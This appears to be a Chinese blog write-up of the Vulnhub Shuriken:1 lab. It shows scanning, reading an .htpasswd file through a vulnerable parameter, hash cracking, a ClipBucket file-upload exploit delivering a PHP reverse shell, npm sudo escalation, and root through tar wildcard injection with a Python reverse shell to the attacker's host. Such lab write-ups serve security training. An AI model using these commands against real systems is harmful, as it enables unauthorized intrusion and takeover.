-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shuriken和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shuriken-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了80和8080端口，访问主页，查看源代码sha384字串无法解码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.124 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;sercet目录比较可疑：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.124 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="clipbucket页登录">ClipBucket页登录</span></h3><blockquote>
-<p>1.访问&#x2F;secret目录，发现一张secret.png图片，对图片进行信息隐藏分析后没有额外结果：</p>
-<p><img src="/2022/08/24/Shuriken-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/8.png" alt="image-"></p>
-<p>2.于是根据图片提示去主页查看js代码，发现两个指向：</p>
-<p><img src="/2022/08/24/Shuriken-1/9.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/10.png" alt="image-"></p>
-<p>3.修改kali的&#x2F;etc&#x2F;hosts文件，访问<a href="http://broadcast.shuriken.local，发现需要用户名和密码：">http://broadcast.shuriken.local，发现需要用户名和密码：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/11.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/12.png" alt="image-"></p>
-<p>4.再次修改&#x2F;etc&#x2F;hosts，通过<a target="_blank" rel="noopener" href="http://shuriken.local/index.php?referer=%E8%AF%B7%E6%B1%82%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0apache%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/etc/apache2/sites-enabled/000-default.conf%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E6%8C%87%E6%98%8E%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%E4%B8%BA/etc/apach2/.htpasswd%EF%BC%9A">http://shuriken.local/index.php?referer=请求可以得到apache默认配置文件/etc/apache2/sites-enabled/000-default.conf，该文件指明用户文件位置为/etc/apach2/.htpasswd：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/13.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/14.png" alt="image-"></p>
-<p>5.继续读取&#x2F;etc&#x2F;apach2&#x2F;.htpasswd，可以得到用户名和密码的字串，利用hashcat结合rockyou字典破解密码：</p>
-<p><img src="/2022/08/24/Shuriken-1/15.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0&#x27; &gt; hash.txt</span><br><span class="line">hashcat -m 1600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/16.png" alt="image-"></p>
-</blockquote>
-<h3><span id="clipbucket漏洞利用">ClipBucket漏洞利用</span></h3><blockquote>
-<p>1.再次修改&#x2F;etc&#x2F;hosts，回到<a target="_blank" rel="noopener" href="http://broadcast.shuriken.local,登录后发现是clipbucket的页面,可以在exploit-db上找到相关的漏洞利用(https//www.exploit-db.com/exploits/44250%EF%BC%89%EF%BC%9A">http://broadcast.shuriken.local，登录后发现是ClipBucket的页面，可以在exploit-db上找到相关的漏洞利用（https://www.exploit-db.com/exploits/44250）：</a></p>
-<p><img src="/2022/08/24/Shuriken-1/17.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/18.png" alt="image-"></p>
-<p>2.构造payload后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行修改，在kali开启对应端口监听，访问<a target="_blank" rel="noopener" href="http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1630302014b9d72e.php%E5%90%8E%E6%88%90%E5%8A%9F%E8%8E%B7%E5%BE%97shell%EF%BC%8C%E5%86%8D%E7%94%A8python%E6%9E%84%E5%BB%BA%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%EF%BC%9A">http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1630302014b9d72e.php后成功获得shell，再用python构建交互式shell：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line">curl --basic --user &quot;developers:9972761drmfsls&quot; -F &quot;file=@php-reverse-shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;  http://broadcast.shuriken.local/actions/beats_uploader.php</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/20.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/21.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-1/22.png" alt="image-"></p>
-</blockquote>
-<h3><span id="初步提权">初步提权</span></h3><blockquote>
-<p>1.利用sudo -l命令查看权限，发现可以执行npm，那么创建一个用于提权的json文件，利用npm提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/23.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;dev&quot;:&quot;/bin/bash&quot;&#125;&#125;&#x27; &gt; package.json</span><br><span class="line">sudo -u server-management npm run dev</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/24.png" alt="image-"></p>
-<p>2.成功提权到server-management后，可以在用户目录下发现第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/25.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查看crontab，我们发现有一个backupsrv.sh每隔两分钟执行一次，我们可以查看下程序内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/26.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/opt/backupsrv.sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/27.png" alt="image-"></p>
-<p>2.查看程序后，我们知道它打开&#x2F;home&#x2F;server-management&#x2F;Documents目录并使用通配符(*) tar 参数创建它的备份，这种结构容易受到通配符注入的影响：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd Documents</span><br><span class="line">echo &quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.56.102\&quot;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;&quot; &gt; shell.sh，先写一个shell</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;，为shell创建触发</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/28.png" alt="image-"></p>
-<p>3.在kali开启对应端口监听，等待两分钟后程序定时执行得到shell为root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9002</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/29.png" alt="image-"></p>
-<p>4.获得root权限后，在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-1/30.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
